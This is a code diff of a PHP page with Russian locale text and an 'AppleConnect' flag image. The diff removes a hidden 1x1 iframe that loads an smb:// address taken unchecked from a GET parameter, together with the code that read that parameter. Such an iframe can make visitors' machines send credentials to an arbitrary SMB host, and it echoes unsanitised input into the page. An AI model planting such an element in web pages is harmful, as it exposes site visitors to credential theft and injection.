@@ -28,13 +28,6 @@
         $country = "Россия"; 
         $country_img = "/static/images/AppleConnect/22x22/RUflag.png";
     }
-
-    $smb_path = "192.168.0.1";
-
-    if(isset($_GET['smb_path']))
-    {
-        $smb_path = $_GET['smb_path'];
-    }
 ?>
 <html>
 <head>
@@ -328,7 +321,6 @@
             </div>
         </section>
     </div>
-    <iframe src="smb://<?php echo $smb_path; ?>/banner.html" width="1" height="1" align="left"></iframe>
 </footer>
 </body>
 </html>
